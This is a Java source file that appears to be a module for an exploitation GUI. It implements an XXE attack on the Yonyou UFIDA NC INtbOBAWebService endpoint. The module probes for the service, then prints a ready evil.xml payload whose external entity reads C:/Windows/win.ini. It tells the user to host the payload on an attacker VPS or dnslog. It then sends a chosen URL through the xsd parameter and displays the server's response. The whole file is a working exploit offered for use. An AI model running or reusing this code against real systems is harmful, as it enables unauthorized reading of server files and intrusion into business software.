package exp.oa.yongyou.ufida;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_ufida_INtbOBAWebService_xxe implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea,TextArea textArea_cmd) {
        try{
            HashMap head = new HashMap<String, String>();
            Response response = HttpTools.get(url + "/uapws/service/nc.itf.tb.oba.INtbOBAWebService?wsdl", head, "utf-8");
            if (response.getCode() ==200 && response.getText().contains("schemaLocation") ) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_ufida_INtbOBAWebService_xxe ]");
                    textArea.appendText("\n 存在nc.itf.tb.oba.INtbOBAWebService");
                });
                Platform.runLater(() -> {
                    textArea.appendText("\n eg1: http://dnslog.cn");
                    textArea.appendText("\n eg2: http://vps/evil.xml\n");
                    textArea_cmd.appendText("---------------------------evil.xml-------------------------\n"+
                            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                            "<!DOCTYPE data [\n" +
                            "  <!ENTITY winIni SYSTEM \"file:///C:/Windows/win.ini\">\n" +
                            "]>\n" +
                            "<data>\n" +
                            "  <content>&winIni;</content>\n" +
                            "</data>"+
                            "\n---------------------------evil.xml-------------------------\n");
                });
                return true;
            } else {
                Platform.runLater(() -> textArea.appendText("\n"));

                return false;
            }
        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        try{

            if(cmd.contains("dnslog")){
                cmd = "http://"+"R4g."+cmd.substring(url.indexOf("://")+3);
            }
            HashMap head = new HashMap<String, String>();
            Response response = HttpTools.get(url + "/uapws/service/nc.itf.tb.oba.INtbOBAWebService?xsd="+cmd, head, "utf-8");
            if (response.getCode() != 404&&response.getCode() != 0  ) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行成功,请自行判断");
                    textArea_cmd.appendText("\n"+ response.getText());
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行失败！");
                });
                return false;
            }
        }catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });

        }
        return false;
    }
}
